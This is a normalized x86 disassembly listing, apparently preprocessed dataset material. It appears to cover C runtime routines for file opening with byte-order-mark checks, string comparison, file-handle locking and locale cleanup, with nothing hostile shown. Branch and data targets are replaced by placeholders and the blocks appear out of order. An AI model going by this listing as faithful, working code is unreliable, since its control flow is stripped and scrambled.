push [ ebp - 0x18 ]
and esi 0x7fffffff
push 0x3
push eax
push [ ebp - 0xc ]
push esi
push [ ebp + 0x10 ]
call sub_419f81
add esp 0x1c
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] ebx
test dl 0x40
jne r-xdata
mov eax ecx
and eax 0x301
cmp eax 0x301
jne r-xdata
cmp eax 0x14000
je r-xdata
mov [ ebp + 0x14 ] ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
mov dl [ ebp - 0x1 ]
mov ecx [ ebp + 0x14 ]
push [ edi ]
call sub_4149fa
jmp r-xdata
mov edx [ edi ]
mov ecx edx
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edx 0x6
mov [ edx + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_41203f
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
push [ edi ]
call sub_41ad98
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test ecx 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push [ edi ]
call sub_41d588
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop ecx
test esi esi
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
push 0x3
lea eax [ ebp - 0x14 ]
push eax
push [ edi ]
call sub_413ef3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi ebx
dec eax
je r-xdata
cmp esi 0x4
ja r-xdata
mov ecx [ ebp - 0x14 ]
push 0x2
pop edx
cmp eax edx
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
push 0x3
pop ecx
mov [ ebp - 0x14 ] 0xbfbbef
mov [ ebp - 0x28 ] ecx
dec eax
jne r-xdata
cmp esi 0x5
je r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413d49
add esp 0x10
or eax edx
je r-xdata
and ecx 0xffff
cmp ecx 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
add esi eax
cmp ecx esi
jg r-xdata
mov [ ebp - 0x14 ] 0xfeff
jmp r-xdata
jmp r-xdata
push 0x2
pop ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xfeff
jne r-xdata
push [ edi ]
call sub_4149fa
pop ecx
call sub_412060
push 0x16
pop ebx
mov [ eax ] ebx
jmp r-xdata
cmp ecx 0xbfbbef
jne r-xdata
cmp esi 0x4
jbe r-xdata
mov eax ecx
sub eax esi
push eax
lea eax [ ebp - 0x14 ]
add eax esi
push eax
push [ edi ]
call sub_414d00
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push ebx
push edx
push [ edi ]
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413d49
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ edi ]
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_41a848
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
dec eax
je r-xdata
sub_41a87e
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a932
add esp 0x10
mov edi [ ebp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
dec edi
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_41a932
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_410368
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebx ]
push eax
call sub_416685
movzx esi ax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ edi ]
push eax
call sub_416685
add esp 0x10
dec [ ebp + 0x10 ]
movzx eax ax
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
push 0x41
pop edx
push 0x5a
pop esi
sub ebx edi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
dec ecx
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_41aa30
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41aa50
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40eb9e
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_41aa95
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41aa95
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_41aa50
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41ab45
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41ab64
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41ab3c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41ab45
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41ab67
push 0x8
push r--data
call sub_411bb0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_411bf5
retn
push 0xa
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41abea
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_41abf3
push 0x18
push r--data
call sub_411bb0
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
and [ ebp - 0x24 ] 0x0
push 0xb
call sub_416e78
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
or eax esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ad8f
mov eax esi
mov edi [ ebx * 4 + rw-data ]
test edi edi
je r-xdata
call sub_411bf5
retn
push 0x40
push 0x20
call sub_411ad1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp edi eax
jae r-xdata
mov [ ebx * 4 + rw-data ] ecx
add [ rw-data ] 0x20
cmp esi 0xffffffff
jne r-xdata
test [ edi + 0x4 ] 0x1
jne r-xdata
mov esi ebx
shl esi 0x5
mov [ ebp - 0x1c ] esi
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push esi
call sub_41ab67
pop ecx
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
and [ ecx + 0x8 ] 0x0
add ecx 0x40
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc ebx
jmp r-xdata
add edi 0x40
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x28 ] ebx
cmp ebx 0x40
jge r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
push 0xa
call sub_416df0
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
test [ edi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41acc7
push 0xfa0
lea eax [ edi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ edi + 0x8 ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x1
or [ edi ] 0xffffffff
mov esi edi
sub esi [ ebx * 4 + rw-data ]
sar esi 0x6
mov eax ebx
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_41ad98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_41ae1e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_41ae85
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
test ecx ecx
js r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
and [ eax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov ebx ecx
sar ebx 0x5
mov edi ecx
mov eax [ ebx * 4 + rw-data ]
and edi 0x1f
shl edi 0x6
cmp [ edi + eax ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push esi
mov esi [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov [ edi + eax ] esi
xor eax eax
pop esi
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
push 0xfffffff6
dec ecx
je r-xdata
push esi
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push esi
push 0xfffffff4
jmp r-xdata
sub_41af07
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41af2d
push 0x14
push r--data
call sub_411bb0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_41ab67
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_41ae1e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_411bf5
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41aff2
mov eax esi
jmp r-xdata
call sub_41202c
mov [ eax ] esi
sub_41b0db
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_41d84a
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_41b11c
push 0x14
push r--data
call sub_411bb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_412060
push 0x16
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_411bf5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_41b1e3
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b1b7
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_41b1b7
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_41af07
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_41b1e3
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_4106c9
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a0d9
push [ ebp - 0x4 ]
mov esi eax
call sub_40f402
add esp 0x20
mov eax esi
pop esi
leave
retn
or eax 0xffffffff
leave
retn
sub_41b265
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_410368
mov eax [ ebp - 0x10 ]
xor edx edx
cmp [ eax + 0x8 ] edx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d870
add esp 0xc
mov edx eax
jmp r-xdata
pop esi
leave
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov edx 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
pop edi
pop ebx
je r-xdata
movzx ecx [ ebx ]
mov edx [ ebp - 0x10 ]
dec esi
mov eax ecx
inc ebx
test [ eax + edx + 0x19 ] 0x4
push 0x0
mov [ ebp - 0x4 ] ebx
pop edx
je r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
movzx ebx [ edi ]
mov edx [ ebp - 0x10 ]
mov eax ebx
inc edi
test [ eax + edx + 0x19 ] 0x4
push 0x0
pop edx
je r-xdata
test esi esi
jne r-xdata
cmp bx cx
jne r-xdata
test esi esi
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ edi ]
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ eax + ebx + 0x19 ] 0x4
jne r-xdata
sbb edx edx
and edx 0x2
dec edx
test cx cx
je r-xdata
mov al [ edi ]
dec esi
test al al
je r-xdata
mov ebx edx
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
inc ebx
movzx ecx cx
mov [ ebp - 0x4 ] ebx
mov ecx edx
jmp r-xdata
mov al [ edi ]
movzx ebx al
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test esi esi
jne r-xdata
shl ebx 0x8
movzx eax al
or bx ax
movzx ebx bx
inc edi
jmp r-xdata
sub_41b392
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_410368
mov edi [ ebp + 0x10 ]
xor edx edx
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d8e8
add esp 0xc
mov edx eax
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov edx 0x7fffffff
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
movzx eax al
dec edi
inc esi
test [ eax + ecx + 0x19 ] 0x4
mov [ ebp - 0x8 ] esi
je r-xdata
mov si [ ebp - 0x4 ]
movzx eax si
test [ eax + ecx + 0x19 ] 0x10
je r-xdata
test edi edi
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
movzx eax al
inc ebx
test [ eax + ecx + 0x19 ] 0x4
je r-xdata
movzx eax [ eax + ecx + 0x119 ]
mov [ ebp - 0x4 ] eax
mov al [ esi ]
test al al
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] edx
test [ eax + ecx + 0x19 ] 0x4
jne r-xdata
mov ax [ ebp + 0x10 ]
movzx edx ax
push 0x0
test [ edx + ecx + 0x19 ] 0x10
mov [ ebp + 0x10 ] edx
pop edx
je r-xdata
test edi edi
jne r-xdata
shl [ ebp + 0x10 ] 0x8
movzx eax al
or [ ebp + 0x10 ] ax
mov eax [ ebp + 0x10 ]
movzx eax ax
inc esi
mov [ ebp - 0x8 ] esi
mov si ax
mov [ ebp - 0x4 ] eax
cmp si [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov al [ ebx ]
movzx eax al
mov si dx
jmp r-xdata
cmp ax si
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax + ecx + 0x119 ]
mov al [ ebx ]
dec edi
test al al
je r-xdata
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp si [ ecx + 0x12 ]
jb r-xdata
cmp si [ ecx + 0xe ]
ja r-xdata
mov si [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
sbb edx edx
and edx 0x2
dec edx
test si si
je r-xdata
shl [ ebp - 0x4 ] 0x8
movzx eax al
or [ ebp - 0x4 ] ax
mov eax [ ebp - 0x4 ]
movzx eax ax
inc ebx
mov [ ebp + 0x10 ] eax
cmp ax [ ecx + 0xc ]
jb r-xdata
mov ax [ ebp + 0x10 ]
cmp si [ ecx + 0x14 ]
ja r-xdata
add si [ ecx + 0x10 ]
jmp r-xdata
mov esi [ ebp - 0x8 ]
test edi edi
jne r-xdata
cmp ax [ ecx + 0x12 ]
jb r-xdata
cmp ax [ ecx + 0xe ]
ja r-xdata
add si [ ecx + 0x16 ]
jmp r-xdata
jmp r-xdata
cmp ax [ ecx + 0x14 ]
ja r-xdata
add ax [ ecx + 0x10 ]
jmp r-xdata
add ax [ ecx + 0x16 ]
jmp r-xdata
sub_41b54e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
push eax
call sub_40f402
pop ecx
sub_41b64a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f402
pop ecx
push eax
call sub_40f402
pop ecx
sub_41b6b1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40f402
push [ esi + 0x8 ]
call sub_40f402
push [ esi + 0xc ]
call sub_40f402
push [ esi + 0x10 ]
call sub_40f402
push [ esi + 0x14 ]
call sub_40f402
push [ esi + 0x18 ]
call sub_40f402
push [ esi ]
call sub_40f402
push [ esi + 0x20 ]
call sub_40f402
push [ esi + 0x24 ]
call sub_40f402
push [ esi + 0x28 ]
call sub_40f402
push [ esi + 0x2c ]
call sub_40f402
push [ esi + 0x30 ]
call sub_40f402
push [ esi + 0x34 ]
call sub_40f402
push [ esi + 0x1c ]
call sub_40f402
push [ esi + 0x38 ]
call sub_40f402
push [ esi + 0x3c ]
call sub_40f402
add esp 0x40
push [ esi + 0x40 ]
call sub_40f402
push [ esi + 0x44 ]
call sub_40f402
push [ esi + 0x48 ]
call sub_40f402
push [ esi + 0x4c ]
call sub_40f402
push [ esi + 0x50 ]
call sub_40f402
push [ esi + 0x54 ]
call sub_40f402
push [ esi + 0x58 ]
call sub_40f402
push [ esi + 0x5c ]
call sub_40f402
push [ esi + 0x60 ]
call sub_40f402
push [ esi + 0x64 ]
call sub_40f402
push [ esi + 0x68 ]
call sub_40f402
push [ esi + 0x6c ]
call sub_40f402
push [ esi + 0x70 ]
call sub_40f402
push [ esi + 0x74 ]
call sub_40f402
push [ esi + 0x78 ]
call sub_40f402
push [ esi + 0x7c ]
call sub_40f402
add esp 0x40
push [ esi + 0x80 ]
call sub_40f402
push [ esi + 0x84 ]
call sub_40f402
push [ esi + 0x88 ]
call sub_40f402
push [ esi + 0x8c ]
call sub_40f402
push [ esi + 0x90 ]
call sub_40f402
push [ esi + 0x94 ]
call sub_40f402
push [ esi + 0x98 ]
call sub_40f402
push [ esi + 0x9c ]
call sub_40f402
push [ esi + 0xa0 ]
call sub_40f402
push [ esi + 0xa4 ]
call sub_40f402
push [ esi + 0xa8 ]
call sub_40f402
push [ esi + 0xb8 ]
call sub_40f402
push [ esi + 0xbc ]
